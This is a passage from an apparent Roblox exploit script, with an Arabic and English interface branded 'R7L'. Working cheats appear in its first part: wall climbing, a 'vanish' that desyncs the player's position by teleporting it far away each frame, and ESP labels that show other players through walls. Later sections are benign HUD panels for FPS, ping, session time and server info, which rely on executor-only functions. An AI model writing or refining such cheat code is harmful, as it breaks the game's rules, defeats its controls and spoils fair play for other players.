        if WallClimbConnection then WallClimbConnection:Disconnect(); WallClimbConnection = nil end
        setButtonState(WallClimbBtn, false, T18T("ايقاف التسلق"), T18T("تسلق الجدران"), Theme.Active, Theme.ButtonDefault)
    end
    local function startWallClimb()
        WallClimbActive = true
        setButtonState(WallClimbBtn, true, T18T("ايقاف التسلق"), T18T("تسلق الجدران"), Theme.Active, Theme.ButtonDefault)
        WallClimbConnection = RunService.Heartbeat:Connect(function()
            if not WallClimbActive then return end
            local char = LocalPlayer.Character
            if not char then return end
            local root = char:FindFirstChild("HumanoidRootPart")
            if not root then return end
            local rp = RaycastParams.new()
            rp.FilterDescendantsInstances = {char}
            rp.FilterType = Enum.RaycastFilterType.Exclude
            local hit = workspace:Raycast(root.Position, root.CFrame.LookVector * 2.5, rp)
            if hit then
                root.AssemblyLinearVelocity = Vector3.new(root.AssemblyLinearVelocity.X, 40, root.AssemblyLinearVelocity.Z)
            end
        end)
    end
    if WallClimbBtn then
        WallClimbBtn.MouseButton1Click:Connect(function()
            if WallClimbActive then stopWallClimb() else startWallClimb() end
        end)
    end

    local VanishBtn = PlayerPage:FindFirstChild("VanishBtn", true)
    if VanishBtn then
        VanishActive = false

        local _VanishRealCF = nil
        local _VanishHbConn = nil

        local function stopVanish()
            VanishActive = false
            if _VanishHbConn then _VanishHbConn:Disconnect(); _VanishHbConn = nil end
            pcall(function() RunService:UnbindFromRenderStep("_T18VanishRestore") end)
            setButtonState(VanishBtn, false, T18T("ايقاف الاختفاء"), T18T("اختفاء"), Theme.Active, Theme.ButtonBlue)
            pcall(function()
                local char = LocalPlayer.Character
                if not char then return end
                if _VanishRealCF then
                    local root = char:FindFirstChild("HumanoidRootPart")
                    if root then root.CFrame = _VanishRealCF end
                end
                for _, p in ipairs(char:GetDescendants()) do
                    if p:IsA("BasePart") then p.LocalTransparencyModifier = 0 end
                end
            end)
        end

        local function startVanish()
            pcall(function()
                local char = LocalPlayer.Character
                if not char then return end
                local root = char:FindFirstChild("HumanoidRootPart")
                if not root then return end

                for _, p in ipairs(char:GetDescendants()) do
                    if p:IsA("BasePart") then p.LocalTransparencyModifier = 0.6 end
                end

                _VanishRealCF = root.CFrame

                VanishActive = true
                setButtonState(VanishBtn, true, T18T("ايقاف الاختفاء"), T18T("اختفاء"), Theme.Active, Theme.ButtonBlue)

                _VanishHbConn = RunService.Heartbeat:Connect(function()
                    if not VanishActive then return end
                    pcall(function()
                        local c = LocalPlayer.Character
                        if not c then return end
                        local r = c:FindFirstChild("HumanoidRootPart")
                        if r then
                            _VanishRealCF = r.CFrame
                            r.CFrame = CFrame.new(99999999, 0, 99999999)
                        end
                    end)
                end)

                RunService:BindToRenderStep("_T18VanishRestore",
                    Enum.RenderPriority.Camera.Value - 1,
                    function()
                        if not VanishActive or not _VanishRealCF then return end
                        pcall(function()
                            local c = LocalPlayer.Character
                            if not c then return end
                            local r = c:FindFirstChild("HumanoidRootPart")
                            if r then r.CFrame = _VanishRealCF end
                        end)
                    end
                )
            end)
        end

        VanishBtn.MouseButton1Click:Connect(function()
            if VanishActive then stopVanish() else startVanish() end
        end)
    end

    local function stopESP()
        ESPActive = false
        for _, label in pairs(ESPLabels) do pcall(function() label:Destroy() end) end
        ESPLabels = {}
        for _, conn in pairs(ESPConnections) do pcall(function() conn:Disconnect() end) end
        ESPConnections = {}
        setButtonState(ESPBtn, false, T18T("ايقاف ESP"), "ESP", Theme.Active, Theme.ButtonDefault)
    end
    local function startESP()
        ESPActive = true
        setButtonState(ESPBtn, true, T18T("ايقاف ESP"), "ESP", Theme.Active, Theme.ButtonDefault)
        local function addESPLabel(player)
            if player == LocalPlayer then return end
            local bb = Instance.new("BillboardGui")
            bb.Name = "ESP_" .. player.Name
            bb.Size = UDim2.new(0, 100, 0, 30)
            bb.StudsOffset = Vector3.new(0, 3, 0)
            bb.AlwaysOnTop = true
            local lbl = Instance.new("TextLabel")
            lbl.Size = UDim2.new(1, 0, 1, 0)
            lbl.BackgroundTransparency = 1
            lbl.Text = player.Name
            lbl.TextColor3 = Color3.fromRGB(255, 80, 80)
            lbl.Font = Enum.Font.GothamBold
            lbl.TextSize = 14
            lbl.TextStrokeTransparency = 0.5
            lbl.Parent = bb
            table.insert(ESPConnections, player.CharacterAdded:Connect(function(char)
                local hrp = char:WaitForChild("HumanoidRootPart", 5)
                if hrp then bb.Parent = hrp end
            end))
            ESPLabels[player.Name] = bb
            local char = player.Character
            if char then
                local hrp = char:FindFirstChild("HumanoidRootPart")
                if hrp then bb.Parent = hrp end
            end
        end
        for _, p in ipairs(Players:GetPlayers()) do addESPLabel(p) end
        table.insert(ESPConnections, Players.PlayerAdded:Connect(addESPLabel))
        table.insert(ESPConnections, Players.PlayerRemoving:Connect(function(p)
            if ESPLabels[p.Name] then pcall(function() ESPLabels[p.Name]:Destroy() end); ESPLabels[p.Name] = nil end
        end))
    end
    if ESPBtn then
        ESPBtn.MouseButton1Click:Connect(function()
            if ESPActive then stopESP() else startESP() end
        end)
    end
end)()

;(function()

    local AntiLagActive = false
    local AntiLagBtn2 = MudadatPage:FindFirstChild("AntiLagBtn", true)

    local function applyAntiLag()
        pcall(function()
            local ls = game:GetService("Lighting")
            ls.GlobalShadows = false
            ls.FogEnd = 1e6
            ls.Brightness = 1
        end)
        pcall(function()
            settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
        end)
        pcall(function()
            for _, v in ipairs(workspace:GetDescendants()) do
                if v:IsA("ParticleEmitter") or v:IsA("Smoke") or v:IsA("Fire") or v:IsA("Sparkles") then
                    v.Enabled = false
                end
            end
        end)
    end

    local function removeAntiLag()
        pcall(function()
            local ls = game:GetService("Lighting")
            ls.GlobalShadows = true
        end)
        pcall(function()
            settings().Rendering.QualityLevel = Enum.QualityLevel.Automatic
        end)
        pcall(function()
            for _, v in ipairs(workspace:GetDescendants()) do
                if v:IsA("ParticleEmitter") or v:IsA("Smoke") or v:IsA("Fire") or v:IsA("Sparkles") then
                    v.Enabled = true
                end
            end
        end)
    end

    if AntiLagBtn2 then
        AntiLagBtn2.MouseButton1Click:Connect(function()
            AntiLagActive = not AntiLagActive
            if AntiLagActive then
                setButtonState(AntiLagBtn2, true, T18T("ايقاف مضاد لاج"), T18T("مضاد لاج"), Theme.Active, Theme.ButtonDefault)
                applyAntiLag()
            else
                setButtonState(AntiLagBtn2, false, T18T("ايقاف مضاد لاج"), T18T("مضاد لاج"), Theme.Active, Theme.ButtonDefault)
                removeAntiLag()
            end
        end)
    end

    -- ===== R7L HUD helpers (shared style for FPS/Ping + Session) =====
    local HUD_W = 210
    local HUD_SOFT_GREEN = Color3.fromRGB(122, 214, 158)
    local HUD_SOFT_AMBER = Color3.fromRGB(232, 196, 120)
    local HUD_SOFT_RED   = Color3.fromRGB(232, 122, 122)
    local function hudQualityColor(v, good, ok, lowerIsBetter)
        if lowerIsBetter then
            if v <= good then return HUD_SOFT_GREEN elseif v <= ok then return HUD_SOFT_AMBER end
            return HUD_SOFT_RED
        end
        if v >= good then return HUD_SOFT_GREEN elseif v >= ok then return HUD_SOFT_AMBER end
        return HUD_SOFT_RED
    end
    local function hudLabel(parent, text, size, pos, font, tsize, color, align, z)
        local l = Instance.new("TextLabel")
        l.Size = size; l.Position = pos
        l.BackgroundTransparency = 1
        l.Text = text
        l.Font = font; l.TextSize = tsize
        l.TextColor3 = color
        l.TextXAlignment = align or Enum.TextXAlignment.Right
        l.TextYAlignment = Enum.TextYAlignment.Center
        l.TextWrapped = false
        l.ZIndex = z or 3
        l.Parent = parent
        return l
    end
    local function hudMakeGui(name)
        local sg = Instance.new("ScreenGui")
        sg.Name = name
        sg.ResetOnSpawn = false
        sg.IgnoreGuiInset = true
        sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        sg.DisplayOrder = 2147483647
        do local _ok = pcall(function() sg.Parent = game:GetService("CoreGui") end) if not _ok or not sg.Parent then sg.Parent = LocalPlayer:WaitForChild("PlayerGui") end end
        return sg
    end
    -- builds the card + header, returns frame, stroke, scale
    local function hudMakeCard(sg, w, h, pos, titleText)
        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(0, w, 0, h)
        frame.Position = pos
        frame.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
        frame.BackgroundTransparency = 0.04
        frame.BorderSizePixel = 0
        frame.Active = true
        frame.ZIndex = 1
        frame.AnchorPoint = Vector2.new(1, 0)
        frame:SetAttribute("T18OwnScale", true)
        frame.Parent = sg
        makeCorner(frame, 12)
        local stroke = makeStroke(frame, Theme.Border, 1, 0.05)
        makeShadow(frame)
        UiFx.makeGradient(frame, {
            ColorSequenceKeypoint.new(0, Color3.fromRGB(14, 14, 14)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(4, 4, 4)),
        }, 90)
        pcall(function() UiFx.makeStarField(frame, 8) end)
        local scale = Instance.new("UIScale"); scale.Scale = 0.85 * (_T18UserScale or 1); scale.Parent = frame
        local shine = Instance.new("Frame")
        shine.Size = UDim2.new(1, -24, 0, 1)
        shine.Position = UDim2.new(0, 12, 0, 0)
        shine.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        shine.BackgroundTransparency = 0.82
        shine.BorderSizePixel = 0
        shine.ZIndex = 3
        shine.Parent = frame
        hudLabel(frame, "R7L", UDim2.new(0, 40, 0, 16), UDim2.new(0, 12, 0, 9), Enum.Font.GothamBlack, 12, Theme.Text, Enum.TextXAlignment.Left)
        hudLabel(frame, titleText, UDim2.new(1, -70, 0, 16), UDim2.new(0, 56, 0, 9), Enum.Font.GothamMedium, 11, Theme.Muted)
        frame.MouseEnter:Connect(function() TweenService:Create(stroke, TweenInfo.new(0.15), { Color = Color3.fromRGB(90, 90, 90) }):Play() end)
        frame.MouseLeave:Connect(function() TweenService:Create(stroke, TweenInfo.new(0.15), { Color = Theme.Border }):Play() end)
        TweenService:Create(scale, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Scale = _T18UserScale or 1 }):Play()
        return frame, stroke, scale
    end
    local function hudMakeDraggable(frame, onDragged)
        local dragging, dragStart, startPos, dragInput = false, nil, nil, nil
        frame.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging, dragStart, startPos = true, input.Position, frame.Position
                input.Changed:Connect(function()
                    if input.UserInputState == Enum.UserInputState.End then dragging = false end
                end)
            end
        end)
        frame.InputChanged:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then dragInput = input end
        end)
        local c
        c = UserInputService.InputChanged:Connect(function(input)
            if not frame.Parent then c:Disconnect(); return end
            if dragging and input == dragInput then
                local d = input.Position - dragStart
                if d.Magnitude > 3 and onDragged then onDragged() end
                frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
            end
        end)
    end
    local function hudFadeOutAndDestroy(sg, frame)
        if frame and frame.Parent then
            local sc = frame:FindFirstChildOfClass("UIScale")
            if sc then TweenService:Create(sc, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.In), { Scale = 0.85 * (_T18UserScale or 1) }):Play() end
            for _, d in ipairs(frame:GetDescendants()) do
                if d:IsA("TextLabel") then TweenService:Create(d, TweenInfo.new(0.2), { TextTransparency = 1 }):Play()
                elseif d:IsA("UIStroke") then TweenService:Create(d, TweenInfo.new(0.2), { Transparency = 1 }):Play()
                elseif d:IsA("ImageLabel") then TweenService:Create(d, TweenInfo.new(0.2), { ImageTransparency = 1 }):Play()
                elseif d:IsA("Frame") and d.BackgroundTransparency < 1 then TweenService:Create(d, TweenInfo.new(0.2), { BackgroundTransparency = 1 }):Play() end
            end
            TweenService:Create(frame, TweenInfo.new(0.2), { BackgroundTransparency = 1 }):Play()
        end
        task.delay(0.22, function() if sg then pcall(function() sg:Destroy() end) end end)
    end
    _T18HUD = { W = HUD_W, FPS_H = 104 }

    -- ===== FPS / Ping (Pro) =====
    local FPSPingActive = false
    local FPSPingConnection = nil
    local FPSPingGui = nil
    local FPSPingFrame = nil
    local FPSPingBtn2 = OthersPage:FindFirstChild("FPSPingBtn", true)

    local function stopFPSPing()
        FPSPingActive = false
        if FPSPingConnection then FPSPingConnection:Disconnect(); FPSPingConnection = nil end
        local g, f = FPSPingGui, FPSPingFrame
        FPSPingGui, FPSPingFrame = nil, nil
        hudFadeOutAndDestroy(g, f)
        setButtonState(FPSPingBtn2, false, T18T("ايقاف FPS/Ping"), "FPS / Ping", Theme.Active, Theme.ButtonDefault)
        if _T18SessionReposition then _T18SessionReposition() end
    end

    local function startFPSPing()
        FPSPingActive = true
        setButtonState(FPSPingBtn2, true, T18T("ايقاف FPS/Ping"), "FPS / Ping", Theme.Active, Theme.ButtonDefault)
        if _T18SessionReposition then _T18SessionReposition() end
        local W, H = HUD_W, _T18HUD.FPS_H
        local sg = hudMakeGui("T18FPSPing")
        FPSPingGui = sg
        local frame = hudMakeCard(sg, W, H, UDim2.new(1, -10, 0, 8), T18T("الاداء"))
        FPSPingFrame = frame
        hudMakeDraggable(frame)

        -- two stat columns
        local colW = (W - 24 - 1) / 2
        local function statCol(x, caption)
            local val = hudLabel(frame, "--", UDim2.new(0, colW - 8, 0, 26), UDim2.new(0, x, 0, 29), Enum.Font.Code, 24, Theme.Text, Enum.TextXAlignment.Left)
            local cap = hudLabel(frame, caption, UDim2.new(0, colW - 8, 0, 12), UDim2.new(0, x, 0, 55), Enum.Font.GothamMedium, 10, Theme.Muted, Enum.TextXAlignment.Left)
            local dot = Instance.new("Frame")
            dot.Size = UDim2.new(0, 6, 0, 6)
            dot.AnchorPoint = Vector2.new(1, 0.5)
            dot.Position = UDim2.new(0, x + colW - 8, 0, 42)
            dot.BackgroundColor3 = HUD_SOFT_GREEN
            dot.BorderSizePixel = 0
            dot.ZIndex = 4
            dot.Parent = frame
            makeCorner(dot, 3)
            return val, cap, dot
        end
        local fpsVal, _, fpsDot = statCol(12, "FPS")
        local vdiv = Instance.new("Frame")
        vdiv.Size = UDim2.new(0, 1, 0, 34)
        vdiv.Position = UDim2.new(0, 12 + colW, 0, 31)
        vdiv.BackgroundColor3 = Theme.Border
        vdiv.BackgroundTransparency = 0.2
        vdiv.BorderSizePixel = 0
        vdiv.ZIndex = 3
        vdiv.Parent = frame
        local pingVal, _, pingDot = statCol(12 + colW + 9, "PING  ms")

        -- mini FPS history graph
        local graph = Instance.new("Frame")
        graph.Size = UDim2.new(1, -24, 0, 20)
        graph.Position = UDim2.new(0, 12, 0, 74)
        graph.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
        graph.BackgroundTransparency = 0.2
        graph.BorderSizePixel = 0
        graph.ClipsDescendants = true
        graph.ZIndex = 3
        graph.Parent = frame
        makeCorner(graph, 5)
        local BARS, gap = 30, 2
        local barW = ((W - 24) - 8 - gap * (BARS - 1)) / BARS
        local bars, hist = {}, {}
        for i = 1, BARS do
            local b = Instance.new("Frame")
            b.AnchorPoint = Vector2.new(0, 1)
            b.Size = UDim2.new(0, barW, 0, 2)
            b.Position = UDim2.new(0, 4 + (i - 1) * (barW + gap), 1, -3)
            b.BackgroundColor3 = HUD_SOFT_GREEN
            b.BackgroundTransparency = 0.55
            b.BorderSizePixel = 0
            b.ZIndex = 4
            b.Parent = graph
            makeCorner(b, 1)
            bars[i] = b
            hist[i] = 0
        end

        local fpsCount, elapsed = 0, 0
        FPSPingConnection = RunService.RenderStepped:Connect(function(dt)
            if not FPSPingActive then return end
            fpsCount = fpsCount + 1
            elapsed = elapsed + dt
            if elapsed < 0.5 then return end
            local fps = math.round(fpsCount / elapsed)
            fpsCount, elapsed = 0, 0
            local ping = 0
            local ok = pcall(function()
                ping = math.round(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue())
            end)
            if not ok or ping <= 0 then
                pcall(function() ping = math.round(LocalPlayer:GetNetworkPing() * 1000) end)
            end
            fpsVal.Text = tostring(fps)
            pingVal.Text = tostring(ping)
            local fc = hudQualityColor(fps, 55, 30, false)
            local pc = hudQualityColor(ping, 90, 180, true)
            TweenService:Create(fpsDot, TweenInfo.new(0.3), { BackgroundColor3 = fc }):Play()
            TweenService:Create(pingDot, TweenInfo.new(0.3), { BackgroundColor3 = pc }):Play()
            table.remove(hist, 1)
            table.insert(hist, fps)
            local peak = 60
            for _, v in ipairs(hist) do if v > peak then peak = v end end
            for i, b in ipairs(bars) do
                local v = hist[i]
                local hgt = math.max(2, math.floor((v / peak) * 14))
                b.Size = UDim2.new(0, barW, 0, hgt)
                b.BackgroundColor3 = hudQualityColor(v, 55, 30, false)
                b.BackgroundTransparency = (i == BARS) and 0.15 or 0.55
            end
        end)
    end

    if FPSPingBtn2 then
        FPSPingBtn2.MouseButton1Click:Connect(function()
            if FPSPingActive then stopFPSPing() else startFPSPing() end
        end)
    end
    do
        -- ===== R7L Session Timer (Pro) =====
        local SessionBtn2 = OthersPage:FindFirstChild("SessionTimeBtn", true)
        local SessionActive = false
        local SessionGui, SessionFrame, SessionConn = nil, nil, nil
        local SessionDragged = false
        local W, H = HUD_W, 92

        local function sessionTargetPos()
            local k = _T18UserScale or 1
            if FPSPingActive then return UDim2.new(1, -10, 0, 8 + math.floor((_T18HUD.FPS_H + 8) * k)) end
            return UDim2.new(1, -10, 0, 8)
        end
        local function sessionFmt(s)
            s = math.max(0, math.floor(s))
            return string.format("%02d:%02d:%02d", math.floor(s / 3600), math.floor((s % 3600) / 60), s % 60)
        end
        local function clockFmt(t)
            local ok, s = pcall(function() return os.date("%I:%M %p", t) end)
            if not ok or not s then return "--:--" end
            if _T18Lang ~= "en" then s = s:gsub("AM", "ص"):gsub("PM", "م") end
            return s
        end
        _T18SessionReposition = function()
            if SessionDragged then return end
            if SessionFrame and SessionFrame.Parent then
                TweenService:Create(SessionFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), { Position = sessionTargetPos() }):Play()
            end
        end

        -- يعد كل اللي دخلوا السيرفر بعدك (من اول ما اشتغل السكربت)
        local SessionJoinedAfter = 0
        Players.PlayerAdded:Connect(function(plr)
            if plr ~= LocalPlayer then SessionJoinedAfter += 1 end
        end)

        local function stopSession()
            SessionActive = false
            if SessionConn then SessionConn:Disconnect(); SessionConn = nil end
            local g, f = SessionGui, SessionFrame
            SessionGui, SessionFrame = nil, nil
            hudFadeOutAndDestroy(g, f)
            if SessionBtn2 then setButtonState(SessionBtn2, false, T18T("ايقاف المؤقت"), T18T("وقتك بالسيرفر"), Theme.Active, Theme.ButtonDefault) end
        end

        local function startSession()
            SessionActive = true
            SessionDragged = false
            if SessionBtn2 then setButtonState(SessionBtn2, true, T18T("ايقاف المؤقت"), T18T("وقتك بالسيرفر"), Theme.Active, Theme.ButtonDefault) end
            local sg = hudMakeGui("T18SessionTime")
            SessionGui = sg
            local frame = hudMakeCard(sg, W, H, sessionTargetPos(), T18T("وقت وجودك بالسيرفر"))
            frame.Name = "SessionFrame"
            SessionFrame = frame
            hudMakeDraggable(frame, function() SessionDragged = true end)

            -- live pill
            local pill = Instance.new("Frame")
            pill.Size = UDim2.new(0, 46, 0, 16)
            pill.Position = UDim2.new(0, 12, 0, 33)
            pill.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
            pill.BorderSizePixel = 0
            pill.ZIndex = 3
            pill.Parent = frame
            makeCorner(pill, 8)
            makeStroke(pill, Theme.Border, 1, 0.1)
            local dot = Instance.new("Frame")
            dot.Size = UDim2.new(0, 6, 0, 6)
            dot.AnchorPoint = Vector2.new(0, 0.5)
            dot.Position = UDim2.new(0, 7, 0.5, 0)
            dot.BackgroundColor3 = HUD_SOFT_GREEN
            dot.BorderSizePixel = 0
            dot.ZIndex = 4
            dot.Parent = pill
            makeCorner(dot, 3)
            hudLabel(pill, "LIVE", UDim2.new(1, -18, 1, 0), UDim2.new(0, 16, 0, 0), Enum.Font.GothamBold, 9, Theme.Accent, Enum.TextXAlignment.Left, 4)

            -- big time
            local timeLbl = hudLabel(frame, sessionFmt(time()), UDim2.new(1, -76, 0, 28), UDim2.new(0, 64, 0, 27), Enum.Font.Code, 24, Theme.Text)

            -- divider
            local div = Instance.new("Frame")
            div.Size = UDim2.new(1, -24, 0, 1)
            div.Position = UDim2.new(0, 12, 0, 62)
            div.BackgroundColor3 = Theme.Border
            div.BackgroundTransparency = 0.2
            div.BorderSizePixel = 0
            div.ZIndex = 3
            div.Parent = frame

            -- footer chips: join time + players
            local function chip(x, w, icon, text)
                local c = Instance.new("Frame")
                c.Size = UDim2.new(0, w, 0, 18)
                c.Position = UDim2.new(0, x, 0, 67)
                c.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
                c.BackgroundTransparency = 0.1
                c.BorderSizePixel = 0
                c.ZIndex = 3
                c.Parent = frame
                makeCorner(c, 6)
                makeStroke(c, Theme.Border, 1, 0.35)
                hudLabel(c, icon, UDim2.new(0, 16, 1, 0), UDim2.new(0, 4, 0, 0), Enum.Font.GothamBold, 10, Theme.Muted, Enum.TextXAlignment.Center, 4)
                return hudLabel(c, text, UDim2.new(1, -24, 1, 0), UDim2.new(0, 20, 0, 0), Enum.Font.GothamMedium, 10, Theme.Accent, Enum.TextXAlignment.Left, 4)
            end
            local chipW = (W - 24 - 6) / 2
            local joinedAt = os.time() - math.floor(time())
            chip(12, chipW, "◷", T18T("دخلت") .. " " .. clockFmt(joinedAt))
            local afterLbl = chip(12 + chipW + 6, chipW, "+", "")
            afterLbl.TextTruncate = Enum.TextTruncate.AtEnd

            local acc, pulse, lastSec = 1, 0, -1
            SessionConn = RunService.Heartbeat:Connect(function(dt)
                if not SessionActive then return end
                pulse = pulse + dt
                dot.BackgroundTransparency = 0.15 + (math.sin(pulse * 4) + 1) * 0.25
                acc = acc + dt
                if acc < 0.2 then return end
                acc = 0
                local t = time()
                local sec = math.floor(t)
                if sec ~= lastSec then
                    lastSec = sec
                    timeLbl.Text = sessionFmt(t)
                    afterLbl.Text = T18T("دخلوا بعدك") .. " " .. tostring(SessionJoinedAfter)
                end
            end)
        end

        if SessionBtn2 then
            SessionBtn2.MouseButton1Click:Connect(function()
                if SessionActive then stopSession() else startSession() end
            end)
        end
    end

    -- ===== Server Info (Pro) =====
    local ServerInfoBtn2 = OthersPage:FindFirstChild("ServerInfoBtn", true)
    local ServerInfoGui = nil
    local ServerInfoConns = {}
    local ServerInfoClosing = false

    local function siL(ar, en)
        if _T18Lang == "en" then return en end
        return ar
    end

    local function siDisconnect()
        for _, c in ipairs(ServerInfoConns) do pcall(function() c:Disconnect() end) end
        table.clear(ServerInfoConns)
    end

    local function siServerNow()
        local ok, t = pcall(function() return workspace:GetServerTimeNow() end)
        if ok and type(t) == "number" and t > 0 then return t end
        return os.time()
    end

    local function siFmtClock(t)
        local dt = os.date("*t", math.floor(t))
        local h12 = dt.hour % 12
        if h12 == 0 then h12 = 12 end
        return string.format("%d:%02d:%02d %s", h12, dt.min, dt.sec, dt.hour < 12 and siL("ص", "AM") or siL("م", "PM"))
    end

    local function siFmtDate(t)
        local dt = os.date("*t", math.floor(t))
        return string.format("%04d/%02d/%02d", dt.year, dt.month, dt.day)
    end

    local function siShortNum(n)
        n = tonumber(n) or 0
        local s
        if n >= 1e6 then s = string.format("%.1fM", n / 1e6)
        elseif n >= 1e3 then s = string.format("%.1fK", n / 1e3)
        else return tostring(math.floor(n)) end
        return (s:gsub("%.0([KM])", "%1"))
    end

    local function siAgo(iso, now)
        if type(iso) ~= "string" then return nil end
        local y, mo, d, h, mi, s = iso:match("(%d+)-(%d+)-(%d+)T(%d+):(%d+):(%d+)")
        if not y then return nil end
        local then_ = os.time({ year = tonumber(y), month = tonumber(mo), day = tonumber(d), hour = tonumber(h), min = tonumber(mi), sec = tonumber(s) })
        local diff = os.time(os.date("!*t", math.floor(now))) - then_
        if diff < 0 then diff = 0 end
        local function word(n, one, two, few, many, en)
            if _T18Lang == "en" then return string.format("%d %s ago", n, en) end
            if n == 1 then return "قبل " .. one end
            if n == 2 then return "قبل " .. two end
            if n <= 10 then return string.format("قبل %d %s", n, few) end
            return string.format("قبل %d %s", n, many)
        end
        if diff < 3600 then
            return word(math.max(1, math.floor(diff / 60)), "دقيقة", "دقيقتين", "دقايق", "دقيقة", "min")
        elseif diff < 86400 then
            return word(math.floor(diff / 3600), "ساعة", "ساعتين", "ساعات", "ساعة", "h")
        end
        return word(math.floor(diff / 86400), "يوم", "يومين", "ايام", "يوم", "d")
    end

    local function siCopy(text)
        local fn = (setclipboard) or (toclipboard) or (syn and syn.write_clipboard) or (Clipboard and Clipboard.set)
        if type(fn) ~= "function" then return false end
        return (pcall(fn, text))
    end

    local function siCard(parent, size, pos)
        local f = Instance.new("Frame")
        f.Size = size
        f.Position = pos
        f.BackgroundColor3 = Theme.PanelSoft
        f.BackgroundTransparency = 0.15
        f.BorderSizePixel = 0
        f.ZIndex = 3
        f.Parent = parent
        makeCorner(f, 10)
        makeStroke(f, Theme.Border, 1, 0.35)
        return f
    end

    local function siButton(parent, text, size, pos)
        local b = Instance.new("TextButton")
        b.Size = size
        b.Position = pos
        b.BackgroundColor3 = Theme.ButtonDefault
        b.BackgroundTransparency = 0.05
        b.AutoButtonColor = false
        b.Text = text
        b.TextColor3 = Theme.Text
        b.Font = Enum.Font.GothamBold
        b.TextSize = 12
        b.ZIndex = 4
        b.Parent = parent
        makeCorner(b, 9)
        local st = makeStroke(b, Theme.Border, 1, 0.1)
        b.MouseEnter:Connect(function()
            TweenService:Create(b, TweenInfo.new(0.12), { BackgroundColor3 = Theme.ButtonDefaultAlt }):Play()
            TweenService:Create(st, TweenInfo.new(0.12), { Color = Color3.fromRGB(95, 95, 95) }):Play()
        end)
        b.MouseLeave:Connect(function()
            TweenService:Create(b, TweenInfo.new(0.12), { BackgroundColor3 = Theme.ButtonDefault }):Play()
            TweenService:Create(st, TweenInfo.new(0.12), { Color = Theme.Border }):Play()
        end)
        return b
    end

    local function siFlash(btn, okText, original)
        btn.Text = okText
        task.delay(1.3, function()
            if btn and btn.Parent then btn.Text = original end
        end)
    end

    local function closeServerInfo()
        if not ServerInfoGui or ServerInfoClosing then return end
        ServerInfoClosing = true
        siDisconnect()
        local sg = ServerInfoGui
        local holder = sg:FindFirstChild("Holder")
        if holder then
            local card = holder:FindFirstChild("Card")
            local sc = holder:FindFirstChildOfClass("UIScale")
            local sh = holder:FindFirstChild("Shadow")
            local ti = TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
            if card then TweenService:Create(card, ti, { GroupTransparency = 1 }):Play() end
            if sh then TweenService:Create(sh, ti, { ImageTransparency = 1 }):Play() end
            if sc then TweenService:Create(sc, ti, { Scale = sc.Scale * 0.92 }):Play() end
        end
        task.delay(0.2, function()
            pcall(function() sg:Destroy() end)
            if ServerInfoGui == sg then ServerInfoGui = nil end
            ServerInfoClosing = false
        end)
    end

    local function openServerInfo()
        local W, H = 340, 396
        local sg = hudMakeGui("T18ServerInfo")
        ServerInfoGui = sg

        local holder = Instance.new("Frame")
        holder.Name = "Holder"
        holder.AnchorPoint = Vector2.new(0.5, 0.5)
        holder.Size = UDim2.new(0, W, 0, H)
        holder.Position = UDim2.new(0.5, 0, 0.5, 0)
        holder.BackgroundTransparency = 1
        holder.ZIndex = 2
        holder.Parent = sg
        makeShadow(holder)

        local targetScale = (_T18UserScale or 1) * (isTouchDevice and 0.82 or 1)
        local scale = Instance.new("UIScale")
        scale.Scale = targetScale * 0.9
        scale.Parent = holder

        local card = Instance.new("CanvasGroup")
        card.Name = "Card"
        card.Size = UDim2.new(1, 0, 1, 0)
        card.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
        card.BorderSizePixel = 0
        card.GroupTransparency = 1
        card.ZIndex = 2
        card.Parent = holder
        makeCorner(card, 16)
        makeStroke(card, Theme.Border, 1, 0.05)
        -- ملاحظة: UIGradient على CanvasGroup يصبغ كل المحتوى، فنحطه على خلفية منفصلة
        local cardBg = Instance.new("Frame")
        cardBg.Name = "Bg"
        cardBg.Size = UDim2.new(1, 0, 1, 0)
        cardBg.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        cardBg.BorderSizePixel = 0
        cardBg.ZIndex = 1
        cardBg.Parent = card
        makeCorner(cardBg, 16)
        UiFx.makeGradient(cardBg, {
            ColorSequenceKeypoint.new(0, Color3.fromRGB(18, 18, 18)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(5, 5, 5)),
        }, 90)
        pcall(function() UiFx.makeStarField(cardBg, 18) end)

        local shine = Instance.new("Frame")
        shine.Size = UDim2.new(1, -32, 0, 1)
        shine.Position = UDim2.new(0, 16, 0, 0)
        shine.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        shine.BackgroundTransparency = 0.8
        shine.BorderSizePixel = 0
        shine.ZIndex = 5
        shine.Parent = card

        -- ===== Header =====
        local header = Instance.new("Frame")
        header.Size = UDim2.new(1, 0, 0, 50)
        header.BackgroundTransparency = 1
        header.Active = true
        header.ZIndex = 3
        header.Parent = card

        hudLabel(header, siL("معلومات السيرفر", "Server Info"), UDim2.new(1, -130, 0, 20), UDim2.new(0, 116, 0, 9), Enum.Font.GothamBold, 16, Theme.Text)
        hudLabel(header, siL("بيانات مباشرة من السيرفر", "Live data from the server"), UDim2.new(1, -130, 0, 14), UDim2.new(0, 116, 0, 29), Enum.Font.Gotham, 11, Theme.Muted)

        local closeBtn = Instance.new("TextButton")
        closeBtn.Size = UDim2.new(0, 28, 0, 28)
        closeBtn.Position = UDim2.new(0, 12, 0, 11)
        closeBtn.BackgroundColor3 = Theme.ButtonDefault
        closeBtn.AutoButtonColor = false
        closeBtn.Text = "✕"
